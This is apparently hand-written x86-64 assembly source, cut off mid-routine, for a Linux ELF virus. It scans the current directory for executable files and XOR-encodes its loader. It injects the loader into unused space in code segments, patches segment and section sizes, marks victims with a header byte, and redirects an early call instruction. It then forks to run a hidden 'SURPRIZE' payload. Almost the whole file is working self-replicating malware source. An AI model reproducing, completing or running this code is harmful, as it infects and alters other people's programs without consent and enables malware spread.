%define     SIZE_OF_START_LOAD      88 
%define     OFFS_START_LOAD         0x2F     
%define     OFFS_BEGIN_START_LOAD   88
%define     SIZE_OF_MAIN_LOAD       3252    ;(0x54D == 1357)
%define     SIZE_ML                813; SIZE_OF_MAIN_LOAD / 4
%define     OFFS_ML                 0x0F9B ;;(-2925) ;-2961 
%define     SIZE_OF_SURPRIZE        0x10 
%define     OFFS_SURPRIZE           0xFFFFF4C7     
%define     ADDR_OF_SURPRISE_CODE   0xFFFFF4C7
%define     OFFS_OF_ORIG_CODE       0xFFFFFFFFFFFFFEDF

section .data
name_file:     db "hel2", 0
section .text
global _start

_start:
       ;6bytes 
         pop   rax
         push  rax
         push  rdi
         push  rsi
         push  rdx
         push  rcx
         push  rax         ;#
         ;pushf
;^^^^^^^^^^^^^^^^^^^^^^^^^^^
   st_vir:
         push  0
         pop   rdi
    brk:
         push  12
         pop   rax
         syscall
         push  rax       ;@  ;for rdi for 'mprotect'

         add   rax, 4096*2
         push  rax
         pop   rdi
         push  12
         pop   rax
         syscall
;------------------------------------------------------------     0x(22)-bytes
     mprotect:
         pop   rdi       ;@
         mov   rsi, 4096*2
         push  0x07   ;PROT_EXEX|PROT_READ|PROT_WRITE
         pop   rdx
         push  0x0a
         pop   rax
         syscall
      get_ip:
         pop   rsi            ;#   
         push  rsi
         push  rdi
;-----------------------------------------------------------      (21)-bytes
         mov   eax,  OFFS_ML     ;MAIN LOADER OFFSET in the curren file 
         movsxd rax, eax
         add   rsi, rax
         mov   rcx, SIZE_ML      ;size of MAIN LOADER / 4
         mov   edx, 0xAABBCCDD
;------------------------------------------------------------    (19)-bytes
         push  rdi
         push  rdi
         push  rcx
      c_s:
         lodsd
         xor   eax,  edx
         stosd
         loop  c_s
         pop   rcx
         pop   rdi
         pop   rsi
;---------------------------------------------------------------
 c_strt:
         lodsd
         xor   eax,  edx
         stosd
         loop  c_strt
   c_end:
         pop   rdi
         jmp   rdi 
;------------------------------------------------------------     0x0F(15)-bytes

;=============================================================    
divi:    times 16 dw 0xAAAA
;=============================================================
%define  lin_dir_size   51*5+12
%define  lin_stat_size  (6*8)+(4*14)+(6*8)+12
;cur_dir:    db ".", 0
 main_loader:
         pop   rax
         push  rbx
         push  rbp
         push  r13
         push  r12

         push  rdi
         pop   rbp
         mov   r13,  rax
         mov   r12,  rdx
         
         push  r15
         push  r14
         push  r11
         push  r10
         push  r9
         push  r8
         ;sub   r13, 5         ; OFFS_BEGIN_START_LOAD   ;75       ;надо пересчитать размер
         push  rax         ;&*

         xor   rdx, rdx
         push  0x2E
         pop   rdi            ;cur_dir:   db ".", 0
         push  rdi
         mov   rdi, rsp 
         call  _dir_open
         pop   rdi
         xor   r14,  r14      ;addr of SURPRISE
 loop:
         push  rax                ;@@
         sub   rsp, lin_dir_size
         mov   rsi, rsp 
         mov   rdi, rax
         call  _dir_read
         cmp   rax, 1
         jl    err_end
 
         ;mov   rcx, rax
         push   rax
         pop   rcx
         call  read_files
        ; jmp   err_end           ;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
        add   rsp, lin_dir_size
        pop   rax                   ;@@
        jmp   loop
 err_end:
         add   rsp, lin_dir_size
         pop   rax                  ;@@
         pop   rsi                  ;&* pop r13 from 'main_loader'
         push  rsi                  ;%%
    curr_add_stpay:
         mov   eax,  ADDR_OF_SURPRISE_CODE
         ;mov   ebx,  0xAABBCCDD
         movsxd rax, eax
         add   rsi,  rax
         call  _start_payload
         pop   rax               ;%%
    ml_exit:
         mov   ebx,  OFFS_OF_ORIG_CODE
         movsxd   rbx,  ebx
         add   rax,  rbx
         ;mov   rax,  0xAABBCCFF55663311
         cmp   rax,  0           ;just need reserve 4 bytes

         pop   r8
         pop   r9
         pop   r10
         pop   r11
         pop   r14
         pop   r15
         pop   r12
         pop   r13
         pop   rbx
         pop   rbp
         pop   rcx
         pop   rdx
         pop   rsi
         pop   rdi
         push  rax
         xor   rax,  rax
      ret
      ;jmp  rax 
 
 read_files:
        xor   rax, rax
        add   rsi, 0x10
        lodsw
        sub   rcx, rax
        dec   ax
        sub   rsi, 0x12
        add   rsi, rax
        cmp   byte[rsi], 0x08      ;DT_REG
        je    inf_file
        cmp   byte[rsi], 0x04      ;DT_DIR 
        je    inf_dir
     nxt_file:
        cmp   rcx, 0
        jle   r_f_ex
        inc   rsi
        jmp   read_files
    r_f_ex:
       ret
 inf_dir:
        push  rsi
        push  rcx
        pop   rcx
        pop   rsi
        jmp   nxt_file
 inf_file:
        push  rsi
        push  rcx
        sub   rsi, rax
        add   rsi, 0x12
        mov   rdi, rsi
        push  rdi
        ;push   r14
        call  _file_stat  ;rsi+48=st_size, rsi+24 = st_mode
        ;pop    r14
        pop   rdi
        add   rsi, 24
        lodsd
        test  eax, 0b001000001  ;the owner can execute the file?
        jz    inf_exit
        ;add   rsi, 20           ;st_size(size of file in bytes)bytes
        mov   rsi, [rsi+20]
;-------------------------------------------
        ;push   r14
        call  _infect  ;IN: rdi - name of file; rsi - size of file; rbp - start addr of alloc memory(for correct_shell_exec);
                       ;OUT: rax==0(ERROR)/==1(OK); rbx - 
        ;pop    r14
        cmp    rax,  0
        je     inf_exit
        ;cmp    r14,  0
        ;jne    inf_exit
        ;xchg   r14,  rbx
;-------------------------------------------
    inf_exit:
        pop   rcx
        pop   rsi
        ; xor   rcx,  rcx      ;!!!!!!!!!!!!!!!!!!!!!!!!!!
        jmp   nxt_file

      _start_payload:                  ;IN: rsi - addr of SURPRIZE CODE in memmory; ebx - KEY for decode SURPRIZE CODE from this file;
         ;mov   rax,  0x39             ;OUT: rax - PID of new proc 
         push  0x39
         pop   rax
         syscall                 ;fork()
         cmp   rax,  0
         je    ths_new_proc
      ret
      ths_new_proc:
         push  rbp   
         pop   rdi
         mov   ecx,  SIZE_OF_SURPRIZE
         movsxd   rcx,  ecx
      payloop:
         lodsd
         xor   eax,  r12d
         stosd
         loop payloop
         call  rbp
        
         push  0x3C
         pop   rax
         syscall                 ;exit() 
      ret
;====================================================================================
%define  lin_dir_size   51*5+12
%define  lin_stat_size  (6*8)+(4*14)+(6*8)+12

section .text
_file_open:
       ;mov   rdi, rcx    ;address of the string with the file name
       mov   rsi, 2      ;open for reading
       mov   rdx, 0      ;
       mov   rax, 2      ;system call number
       syscall
       ret               ; in rax - file descriptor
_file_close:
       ;mov   rdi, rcx    ;file descriptor
       mov   rax, 3      ;system call number
       syscall
       ret
_file_read:
       mov   rdi, rcx    ;file descriptor
       mov   rsi, rdx    ;bufer addr 
       mov   rdx, r8     ;bufer size
       mov   rax, 0      ;syscall number
       syscall
       ret               ; in rax - count of bytes
_file_write:
       mov   rdi, rcx
       mov   rsi, rdx
       mov   rdx, r8
       mov   rax, 1
       syscall
       ret
_file_stat:
       sub   rsp, lin_stat_size
       mov   rsi, rsp
       mov   rax, 0x04
       syscall
       add   rsp, lin_stat_size
       ret
_dir_open:
       mov   rsi, 65536
       mov   rax, 2
       syscall
       ret
_dir_read:     ;int getdents(unsigned int fd-rdi, struct linux_dirent *dir-rsi, unsignted int count-rdx);
       mov   rdx, lin_dir_size - 12
       mov   rax, 78
       syscall
       ret
_mmap:
       mov   rdx, 0x03      ;READ_WRITE=2; READ=1; EXEC=4; NONE=0
       mov   r10, 0x01      ;MAP_PRIVAT=2; MAP_SHARED=1; MAP_FIXED=0x10
       mov   r8, rax        ;file descriptor
       mov   r9, 0x00       ;offset into file
       mov   rax, 0x09
       syscall
       ret                 ;return in rax addr of allocated memory
;=============================================================================================================
;=============================================================================================================
;IN: rdi - name of file; rsi - size of file; rbp - start addr of alloc memory(for correct_shell_exec);
;r12 - key; r13 - addr of next command of ORIGINAL CODE(NOT SHELL!!!);
;OUT: rax == 0(ERROR); rax == 1(OK);
;=============================================================================================================
_infect:
      push  r13
      push  r12
      push  rbp

      push  rsi
      call  _file_open
      pop   rsi
      push  rax         ;for _file_close in infect_out
      cmp   eax, 3
      jl    infect_out
      xor   rdi, rdi
      call  _mmap
      call  check_exec
      cmp   al, 2
      jl    infect_out
      
      call  check_seg
      call  check_infected
      cmp   al,   0
      je    infect_out 
;-----------------------------------------------------      
      push  rsi   ;#
      push  rdi   ;*
      ;call  cur_add
   cur_add:
      mov   rsi,  r13
      mov   ecx,  OFFS_SURPRIZE     
      movsxd rcx, ecx
      add   rsi, rcx                ;ADDR(offset in file) of SURPRISE
      mov   rcx,  SIZE_OF_SURPRIZE  ;SIZE of SURPRISE
      push  rbp
      pop   rdi
      add   rdi,  0x1000
      push  rdi

      call  xor_code                ;IN:  rsi - addr of FROM bufer;  rdi - addr of TO bufer; rcx - size of data;  r12 - key; 
      pop   rsi                  ;ADDR of SURPRISE 
      pop   rdi   ;*
      mov   r12,  rbp
      call  inect_shell_data
      cmp   rax,  0
      jne   inf_nxt1
      pop   rsi      ;#
      je    infect_out  
   inf_nxt1:
      mov   r14,  rbx
      push  rdi
      push  rbx
      push  rbx
      pop   rdi
      pop   rsi
      call  xor_code
      pop   rdi
      pop   rsi   ;#
      call  correct_sizes   ;rax - addr of modified segment header; rcx - size of data; rbx - the addr from which the injection begins; rdi - addr of zero offset of file; si - e_phnum; dx - e_shnum; r10 - e_phoff; r11 - e_shoff;
;----------------------------------------
      ;mov  r12, rbp                    ;key  
      push  rsi         ;$
      push  rbp
      pop   rsi                          ;ADDR of MAIN LOADER
      mov   rcx, SIZE_OF_MAIN_LOAD     ;SIZE of MAIN LOADER 
      call  inect_shell_data
      cmp   rax,  0
      jne   inf_nxt2
      pop   rsi         ;$
      je    infect_out
   inf_nxt2:
      mov   r15,  rbx
      call  correct_sizes
      ;sub   r14,  r15
      call  find_entr                  ;OUT: rbx - addr of nxt command after changed "call" in memory; cl - opcode;
      cmp   rax,  0
      jne   inf_nxt
      pop   rsi         ;$
      jmp   infect_out
   inf_nxt: 
      sub   r14,  rbx
      mov   dword[r15+cur_add-main_loader+4], r14d
      mov   dword[r15+curr_add_stpay-main_loader+1], r14d
      ;mov   dword[r15+curr_add_stpay-main_loader+5+1],   r12d     ;KEY
      mov   r14,  rbx
   ;----------------------
      mov   ebx,  dword[rbx-4] 
      cmp   cl,   0xFF
      jne   ent_e8
      ;mov   rbx,  qword[rbx+r14] 
      ;mov   dword[r15+ml_exit-main_loader], 0xFFB84890     ;"nop"(0x90)+"movabs rax, 0x...ff"(0xffb848)
      ;mov   qword[r15+ml_exit-main_loader+3],   rbx
      mov   dword[r15+ml_exit-main_loader+11],  0x90008B48   ;"mov  rax,  [rax]"(0x008b48)+"nop"(0x90)
      jmp   ent_end 
   ent_e8:
      ;mov   byte[r15+ml_exit-main_loader],   0xDD           ;"mov ebx, 0x..."
      ;mov   dword[r15+ml_exit-main_loader+3],   0x63480000   ; 0x0000 + "movsxd rbx, ebx"+"add rax, rbx"
      ;mov   dword[r15+ml_exit-main_loader+7],   0xD80148DB   ; 0x0000 + "movsxd rbx, ebx"+"add rax, rbx"
      mov   dword[r15+ml_exit-main_loader+11],  0x00F88348     ;"cmp rax, 0"
   ent_end:
      mov   dword[r15+ml_exit-main_loader+1], ebx   ;!!!!!!!!!!!!! ;save 32-bit offset of intercepted CALL
      pop   rsi         ;$
   ;-----------------------
      push  rbp       
      mov   rcx,  SIZE_OF_START_LOAD 
      add   rbp,  0x1000
      mov   r12,  rbp
      push  r13
   cur_add1:
      mov   ebx,  OFFS_START_LOAD
      movsxd   rbx,  ebx
      add   r13,  rbx
      call  collect_shell_exec      ;IN: r13 - addr of EXEC_SHELL, rcx - size of code; rbp - addr for bufer for code; OUT: rbp - addr of bufer with code;   rcx - size of code;
      pop   r13
      pop   rbp
      push  rbp         ;^^

      ;r12               ;addr of bufer for EXEC_SHELL
      push  SIZE_OF_START_LOAD      ;SIZE of EXEC_SHELL
      pop   rcx
      xchg  r13,  r14
      call  inect_shell_exec
   inf_nxt3:
      sub   rbx,  r13
      mov   dword[r15+cur_add1-main_loader+1],  ebx 
      xor   r14,  r14
      ;mov   r14d,  dword[r13-4]        ;save in r14   32-bit offset of intercepted CALL
      mov   dword[r13-4],  ebx
      ;sub   r14,  rbx
      ;mov   dword[r15+cur_add-main_loader+4], r14d

      pop   r12         ;^^   ;key
      push  r15
      pop   rsi
      push  rsi
      pop   rdi
      mov   rcx, SIZE_OF_MAIN_LOAD     ;SIZE of MAIN LOADER 
      ;call  xor_code
      push  1
      pop   rax
;------------------------------------------------------------------
 infect_out:
      pop   rdi      ;file descriptor
      push  rax
      call  _file_close
      pop   rax
   
      pop   rbp
      pop   r12
      pop   r13
   ret
;--------------------------------------------------------------------------------------------------------------------------------------
;IN: rdi - addr of zero offset of file; si - e_phnum; dx - e_shnum; r10 - e_phoff; r11 - e_shoff; (HAVEN'T r8 - e_phnum; r9 - e_shnum);
;r9(31-63 bits) - bit map of LOAD EXEC segments; rcx - size of code; r12 - addr of bufer of code;
;OUT: rbx - addr of nxt command after changed "call" in memory; cl - opcode;
;--------------------------------------------------------------------------------------------------------------------------------------
find_entr:
      push  rdi
      push  rsi
      sub   rsp,  hde64s_size

      mov   rsi,  [rdi+24]    ;+24 - offset in file of e_entry
      add   rsi,  rdi
      mov   rdi,  rsp
   fi_en_lo:
      push  rsi
      call  _hde
      pop   rbx
      add   rsi,  rbx
      cmp   al,   0x00 
      je    fi_en_exit
      cmp   byte[rdi+hde64s.opcode],   0xFF   ;"CALLN" or "CALLF"
      jne   E8 
      cmp   byte[rdi+hde64s.modrm_ro], 0x02   ;"CALLN"
      je    chng_call 
      cmp   byte[rdi+hde64s.modrm_ro],   0x03   ;"CALLF"
      je    chng_call 
   E8:
      cmp   byte[rdi+hde64s.opcode],   0xE8     ;"call"
      jne   fi_en_lo
      jmp   fi_fi
   chng_call:
      mov   word[rsi-6],   0xE890      ;"nop" + E8(opcode of command "call") 
   fi_fi: 
      push  rsi
      pop   rbx
      mov   cl,   byte[rdi+hde64s.opcode]
      ;add  rbx, 0x1151

   fi_en_exit:
      add   rsp,  hde64s_size
      pop   rsi
      pop   rdi
   ret                  
;-----------------------------------------------------------------------------------------------------------------------------------------
;IN:  rdi - addr of zero offset of file; si - e_phnum; dx - e_shnum; r10 - e_phoff; r11 - e_shoff; (HAVEN'T r8 - e_phnum; r9 - e_shnum);
;OUT: rax==0(file was infected) rax==1(file is infected); 
;-----------------------------------------------------------------------------------------------------------------------------------------
check_infected:
      xor   rax,  rax
      cmp   byte[rdi+14],  0xAA
      je    chk_inf_out
      mov   byte[rdi+14],  0xAA
      inc   al
   chk_inf_out:
   ret
;-----------------------------------------------------------------------------------------------------------------------------------------
;IN:  rdi - addr of zero offset of file; si - e_phnum; dx - e_shnum; r10 - e_phoff; r11 - e_shoff; (HAVEN'T r8 - e_phnum; r9 - e_shnum);
;r9(31-63 bits) - bit map of LOAD EXEC segments; rcx - size of code; r12 - addr of bufer of code;
;OUT: rbx - addr of start EXEC_SHELL code in memory
;-----------------------------------------------------------------------------------------------------------------------------------------
inect_shell_exec:
      push  rdi
      push  r10
      add   r10,  rdi
      rol   r9,  32
      xor   rax,  rax
      push  rax
   i_sh_d_lo:
      push  r10
      bsf   rax,  r9
      btr   r9,  rax
      mov   bl,   56
      mul   bl                ;e_phsize == 56 
      add   r10,  rax
      push  r9
      mov   rax,  [rsp+16]
      call  nork_in_segment 
      mov   [rsp+16],   rax
      pop   r9
      pop   r10
      cmp   rcx,  0
      jle   in_sh_da_exit
      cmp   r9d,  0
      jne   i_sh_d_lo 
  in_sh_da_exit: 
      pop   rax
      rol   r9,   32
      pop   r10
      pop   rdi
   ret
;--------------------------------------------------------------------------------------------------------------------------------------------------
;IN:  r10 - file offset(addr of curr ELF64_Phdr); si - e_phnum; dx - e_shnum; r10 - e_phoff; r11 - e_shoff;
;r9(31-63 bits) - bit map of LOAD EXEC segments; rcx - size of code; r12 - addr of bufer of code;
;OUT: rax - addr of "jmp 0x..."(from r10 of find_nork); rcx - count of bytes which need will written; rbx - addr of start EXEC_SHELL code in memory
;---------------------------------------------------------------------------------------------------------------------------------------------------
nork_in_segment:
      push  rdi
      push  rsi
      push  r14   
      push  r10
      push  rdx      ;$
      push  r11      ;@
      jmp   jm_dist
tab_code_len:         db 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, ;tab_code_len == 30 bytes + 7 bytes
      tab_brk:        db 0x02, 0x01, 0x02, 0x01, 0x02, 0x01, 0x06, 0x01, 0x01, 0x02, 0x01, 0x02
      tab_mprotect:   db 0x01, 0x05, 0x02, 0x01, 0x02, 0x01, 0x02
      tab_get_ip:     db 0x01, 0x01, 0x01, 0x05, 0x03, 0x03, 0x05, 0x05
   ;---------------------------
      tab_test1:      db 0x01, 0x01, 0x01, 0x06, 0x01, 0x01, 0x01
   ;---------------------------
      tab_c_strt:     db 0x06 
      tab_c_end:      db 0x01, 0x02                                                                
   jm_dist:
      xor   r14,  r14
      push  rdx
      push  rcx
      pop   r8
      pop   rcx
      call  cal_addr
   cal_addr:
      pop   r9
      sub   r9,   cal_addr-tab_code_len

      mov   rbx,   [r10+8]   ;start addr of segment in file
      mov   rsi,   [r10+64]  ;end addr of segment and start addr of NEXT segment in file
      xchg  r10,   rax        ;addr of "jmp 0x..."for find_nork

   nork_seg_loop:
      mov   rax,  [rdi+r11+24]   ;start addr CURRENT section
      mov   rdx,  [rdi+r11+88]   ;start addr of NEXT section 

      cmp   rax,  rbx
      jl    skip_seg_loop
      cmp   rax,  rsi
      jge   nork_seg_exit  ;skip_seg_loop

      push  rsi
      push  rbx
      push  rcx

      push  r8                   ;size of code;    r9 - addr of tab_code_len
      push  rdi

      sub   rdx,  rax            ;size of section
      mov   rsi,  r12
      add   rdi,  rax
      push  rdi
      ;mov   r9,   tab_code_len   ;должет быть позиционнонезависимым!!!!!!!!!!!!
      call  find_nork            ;rdi-addr of section in memory; rdx-size of section; r8-size of code; r9-addr of tab_code_len
      xchg  r12,  rsi            ;from rsi to r12 addr of next command of the code
      ;mov   rax,  [rsp-64]       ;%
      ;cmp   r14,  0
      ;jne   s_nx_lo
      ;mov   r14,  rbx
   s_nx_lo:
      pop   rbx
      pop   rdi
      pop   rcx

      cmp   r8,   0
      jle   zer_r8
      sub   rcx,  r8
      cmp   rcx,  0
      jle   no_szs
      add   rcx,  6
   zer_r8:
      mov   rax,  [rsp+40]            ;addr of modified segment header
      push  r11
      push  r8
      mov   r11,  [rsp+40]       ;@
      mov   rdx,  [rsp+48]       ;6*8$
      call correct_sizes
      pop   r8
      pop   r11
   no_szs:
      pop   rcx
      pop   rbx
      pop   rsi

      cmp   r8,   0
      jle   nork_seg_exit
   skip_seg_loop:
      add   r11,  64
      loop  nork_seg_loop

   nork_seg_exit:
      xchg  rcx,  r8             ;remaining  size of code
      xchg  r10,  rax            ;addr of 'jmp 0x...' from  find_nork
      xchg  r14,  rbx
      pop   r11
      pop   rdx
      pop   r10
      pop   r14
      pop   rsi
      pop   rdi
   ret
;---------------------------------------------------------------------------------------------------------------------------
;IN:  r13 - start addr of code;  rcx - size of code; rbp - addr for bufer with code;
;OUT: rbp - addr of bufer with code;   rcx - size of code;
;CAN CHANGE: rdi, rdx, r9, r11, r12, r13, r14, r15
;---------------------------------------------------------------------------------------------------------------------------
collect_shell_exec:
      push  rsi
      push  rdi
      push  rbp
      pop   rdi

      xor   rax,  rax
      mov   rsi,  r13
   co_sh_ex:
      lodsb
      cmp   al,   0xE9     ;'jmp 0x00000000'
      jne   co_sh_ex1
      cmp   byte[rsi+4], 0xC3  ;'ret' 
      je    add_rsi_w
      jmp   co_sh_ex2
   co_sh_ex1:
      cmp   al,   0xEB     ;'jmp 0x00'
      jne   co_sh_ex2
      cmp   byte[rsi+1], 0xC3
      je    add_rsi_b
   co_sh_ex2:
      stosb
      loop  co_sh_ex
      jmp   cll_sh_exec
   add_rsi_b:
      xor   eax,  eax
      lodsb
      jmp   add_rsi
   add_rsi_w:
      lodsd
   add_rsi:
      add   rsi,  rax
      jmp   co_sh_ex
   cll_sh_exec:
      pop   rdi
      pop   rsi
   ret
;----------------------------------------------------------------------------------------------------------------
;BYTES:  52
;IN: rax - start addr of file
;OUT: al = 0(not ELF); al = 2(file EXECUT);   al = 3(file DYNAMIC);  rdi - start addr of file in memory;
;     si - e_phnum; dx - e_shnum; r10 - e_phoff; r11 - e_shoff; (HAVEN'T r8 - e_phnum; r9 - e_shnum;) 
;----------------------------------------------------------------------------------------------------------------
check_exec:                                        
      push  rax
      pop   rdi
      cmp   dword[rdi],    0x464C457F
      jne   check_exec_err
      mov   al,   byte[rdi+16]
      cmp   al,   0x03
      je    check_exec_out
      cmp   al,   0x02
      jne    check_exec_err
check_exec_out:
      cmp   byte[rdi+52], 64        ;e_ehsize
      jne   check_exec_err
      mov   r10,  [rdi+32]          ;e_phoff
      mov   r11,  [rdi+40]          ;e_shoff
      xor   rsi,  rsi
      push  rsi
      pop   rdx
      mov   si,  word[rdi+56]     ;e_ephnum
      mov   dx,  word[rdi+60]     ;e_shnum
   ret
check_exec_err:
      xor   al,   al
   ret
;-------------------------------------------------------------------------------------------------------------------------------------------
;BYTES: 37 + 34(check_seg_flags) 
;IN:  rdi - addr of zero offset of file; si - e_phnum; dx - e_shnum; r10 - e_phoff; r11 - e_shoff; (HAVEN'T r8 - e_phnum; r9 - e_shnum);
;OUT: r9- bit map of READ/READ and WRITE segments; r9(31-63 bits) - bit map of EXEC segments;
;-------------------------------------------------------------------------------------------------------------------------------------------
check_seg:
      push  rdi
      xor   r9,  r9
      push  r9
      pop   rcx
      mov   cx,   si
      dec   cl
      push  56
      pop   rax
      add   rdi,  r10
      mul   cl
      add   rdi,  rax
   ine_loop1:
      cmp   byte[rdi], 1   ;check PROGRAM segment is LOAD or NOT
      jne   ine_ret1 
      ;call  check_seg_flags
      jmp   check_seg_flags
   ine_ret1:
      sub   rdi, 56 
      loop  ine_loop1
   ine_shell2_exit:
      pop   rdi
      ret
;-------------------------------------------------------------------------------------------------------------------------------------------
;BYTES: 34
;IN:  rdi - addr of p_type in file;   rcx - number of curr segment; rbx - bit map of EXEC(31-63bits)/READ/READ and WRITE segments;
;OUT: r9 - bit map of READ/READ and WRITE segments; r9(31-63 bits) - bit map of EXEC segments;
;------------------------------------------------------------------------------------------------------------------------------------------- 
   check_seg_flags: 
      test  byte[rdi+4],   0x01  ;EXEC
      jz    ch_fl_rw
      rol   r9,  32
      bts   r9,  rcx
      rol   r9,  32 
      jmp   ch_fl_exit
   ch_fl_rw:
      test  byte[rdi+4],  0x06     ;READ/ READ WRITE 
      jz    ch_fl_exit
      bts   r9,  rcx
   ch_fl_exit:
      jmp   ine_ret1
   ;ret
;---------------------------------------------------------------------------------------------------------------------------
;BYTES:  42
;IN:  rax - addr of modified segment header; rcx - size of data; rbx - the addr from which the injection begins;
;rdi - addr of zero offset of file;  si - e_phnum; dx - e_shnum; r10 - e_phoff; r11 - e_shoff;
;OUT: rax - number of section header which was infected;  rax == 0 => ERROR(wasn't infected);
;---------------------------------------------------------------------------------------------------------------------------
correct_sizes:
   sz_segm:
      mov   r8,  [rax+32] ;p_filesize
      add   r8,  rcx
      mov   [rax+32],  r8
      mov   r8,  [rax+40] ;p_memsize
      add   r8,  rcx
      mov   [rax+40],  r8
   sz_sect:
      push  rbx
      push  rdi
      push  rdx
      sub   rbx,  rdi
      add   rdi,  r11
      push  -40
      pop   rax
   sz_sect_loop:
      cmp   dl,   0
      je    sz_sect_exit
      dec   dl
      add   rax,  64          ;[rid+r11+24(rax)] = sh_offset
      cmp   rbx,   [rdi+rax]        
      jl    sz_sect_loop
      cmp   rbx,  [rdi+rax+64]
      jge    sz_sect_loop

      add   [rdi+rax+8],   rcx
      pop   rax
      push  rax
      sub   rax,  rdx
   sz_sect_exit:    
      pop   rdx
      pop   rdi
      pop   rbx
   ret
;================================================================================================================================================================================
;BYTES:  68 + 25(xor_code)
;IN:  rdi - addr of zero offset of file;  si - e_phnum; dx - e_shnum; r10 - e_phoff; r11 - e_shoff; (HAVEN'T r8 - e_phnum; r9 - e_shnum);
;r12 - key; r9 - bit map of EXEC/READ/READ and WRITE segments; rcx - size of inect bufer;   rsi- addr of inect bufer; 
;OUT: rax - 0 (error) /  rax - p_offset (segment file offset that was infected); r9-changed; rbx - the addr from which the injection begins; 
;================================================================================================================================================================================
inect_shell_data:
      push  rdi
      push  rsi
      push  rcx
      push  rdx

      push  rdi            ;@
      push  56
      pop   rbx
      add   rdi,  r10
   in_loop:
      xor   rax,  rax
      ;push  rdi
      bsf   eax,  r9d
      btr   r9,  rax
      cmp   al, 0
      jne   in_loop_nxt
      pop   rdi            ;@
      jmp    i_m_l_exit
   in_loop_nxt:
      mul   bl
      mov   r8,   [rdi+rax+64]   ;[rdi+rax+64] = p_offset   - NEXT segment file offset
      mov   rdx,  [rdi+rax+32]   ;[rdi+rax+32] = p_filesz   - Segment size in file
      add   rdx,  [rdi+rax+8]    ;[rdi+rax+8] = p_offset   - Segment file offset
      sub   r8,   rdx 
      cmp   r8,  rcx
      jle   in_loop
      add   rax,  rdi

      pop   rdi            ;@
      add   rdi,  rdx
      push  rdi
      rep   movsb
   xor_code_ret:
      pop   rbx
   i_m_l_exit:
      pop   rdx
      pop   rcx
      pop   rsi
      pop   rdi
   ret
;-----------------------------------------------------------------------------------------------------------
;BYTES: 25 
;IN:  rsi - addr of FROM bufer;  rdi - addr of TO bufer; rcx - size of data;  r12 - key;
;-----------------------------------------------------------------------------------------------------------
xor_code:;push  r12
      push  rax
      push  rcx
      push  rsi
      ;rol   r12, 12
   c_strt1:
      lodsd
      xor   eax, r12d
      stosd
      sub   rcx, 3   
      loop  c_strt1
   ;jmp   xor_code_ret
      pop   rsi
      pop   rcx
      pop   rax
   ret;pop   r12
;====================================================================================================================================;
;IN:  rsi - bufer of code;    rdi - addr of section in memory;   rdx - size of section;  r8 - size of code;   r9 - addr of tab_code_len;
;OUT: r8 - remaining code size;  r14 - addr from inection begins                                                                                                                              ;
;====================================================================================================================================;
   find_nork:
      f_nork:
         xor   rcx,  rcx
         ;xor   r14,  r14
         jmp   ch_quor
      f_n1:
         cmp   rcx,  8
         jge   wr_nork
      f_n11:
         xor   rcx,  rcx
         call  di_dx
      f_n12:
         cmp   rdx, 0
         jle   f_out
         cmp   rcx, r8
         jge   wr_nork
      ch_quor:
         cmp   byte[rdi],  0x00  ;qword[rdi], 0x00
         jne   f_n1
         call  cx_di_dx
         cmp   rdx,  0
         jle   f_out
         cmp   byte[rdi],  0x00  ;qword[rdi], 0x00
         jne   f_n1
      f_n2:
         call  cx_di_dx
         jmp   f_n12
 
   wr_nork:
         ;sub   rcx, 4      ;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! 4==offset between file code and shell code(my code)
         sub   rdi, rcx
         cmp   r10, 0
         je    wr_she
      my_ip_nork:
         push  rdi
         pop   rax
         sub   rax, r10
         sub   rax, 4
         push  rax         ;@

         cmp   eax, 125
         jg    wr_bjmp
         cmp   eax,  -125
         jl    wr_bjmp
         mov   rax,  rcx
         sub   al,   6
         sub   al,   [r9]
         cmp   al,   0
         jl    wr_bjmp
         push  rdi
         push  rcx
         mov   rdi,  r10
         dec   rdi
         push  6
         pop   rcx
         push  3
         pop   rax
         call  write_shell
         sub   qword[rsp+8*6],   rbx      ;[rsp+(8*9)] == 'push r8' from nork_seg_loop
         pop   rcx
         pop   rdi
         cmp   al, 0
         je    wr_bjmp
         
         pop   rax            ;@
         
         mov   byte[r10+3], al
         jmp   wr_she
      wr_bjmp:
         pop   rax
         mov   dword[r10], eax
      wr_she:
      ;wr_she1:
         cmp   r8,   rcx
         jg    wr_she1
         push  1
         pop   rax
         jmp   wr_she2
      wr_she1:
         push  6
         pop   rax
      wr_she2:
         call  write_shell;rep   movsb
         cmp   rax,  0
         jne   wr_ok
        ; push  3
        ; pop   rax
        ; push  rdi
        ; call  write_shell
        ; pop   rbx
        ; sub   rbx, rdi
        ; mov   r10, rdi
        ; inc   rdi
        ; mov   byte[rdi], bl
        ; inc   rdi
        ; jmp   wr_ok1   
      wr_ok:
         mov   r10, rdi
         add   rdi, 5      ;4
      wr_ok1:
         cmp   r8, 0
         jg    f_n11
         jmp   f_end
      f_out:
         cmp   rcx, 8
         jge   wr_nork
      f_end:
         cmp   r8, 0
         jge   f_exit
         xor   r8, r8
      f_exit:
      ret

   cx_di_dx:
         add   rcx,  1  ;8
      di_dx:
         add   rdi, 1   ;8
         sub   rdx, 1   ;8
      ret
;============================================================================================================================;
;IN: rdi-addr in file;  rsi-addr of code; rcx-size of free space in file for code; r8-size of code; r9 - addr of tab_code_len;
;OUT: rdi-addr of "jmp 'next comand of shell code'";  rsi-addr of code; r9 - addr of tab_code_len; r8 - remaining code size  ;
;rbx - count of bytes were written;                                                                                          ; 
;============================================================================================================================;
  write_shell:
         push  rcx
         push  rdx
         sub   rcx, rax         ;5      ;size of jmp command + ret(0xC3)
         ;push  rbp
         cmp   al,   1
         jne   wr_sh
         inc   cl
     wr_sh:
         push  r15
         push  rax
         xor   rax, rax
     w_s_f:
         add   al, byte[r9]
         inc   r9
         cmp   rax, r8
         jge   w_shell
         cmp   rax, rcx
         jl    w_s_f
         je    w_shell
         sub   al, byte[r9-1]
         dec   r9
         cmp   al,  0
         jne   w_shell
         pop   rax
      w_sf_out:
         xor   rax,  rax
         jmp   w_shell_exit
   w_shell:
         cmp   rax, r8
         jl    w_sh
         xchg  rax, r8
         xor   r8, r8
   w_sh:
         cmp   r14, 0
         jne   w_sh1
         push  rdi
         pop   r14
        ; pop   rax
        ; push  rax
        ; cmp   al, 3
        ; jne   w_sh1
        ; bts   r14,  63
   w_sh1:
         sub   r8,   rax
   w_no_ow1:
        ; xchg  rax, rcx
         push  rax
         push  rcx
         pop   rdx
         pop   rcx
